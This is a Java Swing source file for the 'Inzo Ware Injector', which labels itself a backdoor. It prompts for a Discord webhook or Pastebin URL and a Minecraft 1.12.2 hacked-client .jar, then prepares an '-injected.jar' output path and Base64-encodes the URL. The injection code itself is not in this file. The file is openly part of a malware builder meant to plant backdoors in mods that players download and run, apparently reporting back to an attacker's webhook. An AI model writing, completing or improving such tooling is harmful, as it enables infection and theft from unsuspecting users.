package com.inzo.technologies.inzoware.injector;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;
import com.formdev.flatlaf.FlatDarkLaf;
import java.util.Base64;

public class GUI{

    public static void main(String[] args){
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "Inzo Ware Injector\n" +
                            "Requirements:\n" +
                            "   * Discord Webhook or PasteBin URL\n" +
                            "   * Target Hacked Client .jar file (1.12.2)",
                    "INZO_Technologies",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: INZO_Technologies,\n" +
                                "Backdoor Version: 2.11.1\n" +
                                "Release Date: \n" +
                                "Credits: ThnksCJ, Skillnoob, NoWhere",
                        "INZO_Technologies",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }
        
         /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Forge 1.12.2 Mod (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-injected.jar";
        
        /*--- Query options ---*/
        Boolean pastebinurl;
        String URLlist;

        int sender = JOptionPane.showConfirmDialog(null, "Do you Want A Pastebin URL?", "Inzo Ware Injector", JOptionPane.YES_NO_OPTION);
        pastebinurl = sender == JOptionPane.YES_OPTION;

        URLlist = (String)JOptionPane.showInputDialog(
                null,
                "Insert " + (pastebinurl ? "PasteBin URL" : "Webhook") + ":",
                "Inzo Ware Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );
        
        String SenderURL = URLlist;
        String encodedSenderURL = Base64.getEncoder().encodeToString(SenderURL.getBytes());
        System.out.println((pastebinurl ? "PasteBin URL" : "Webhook") + ": " + encodedSenderURL);

    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Inzo Ware Injector", JOptionPane.ERROR_MESSAGE);
    }
}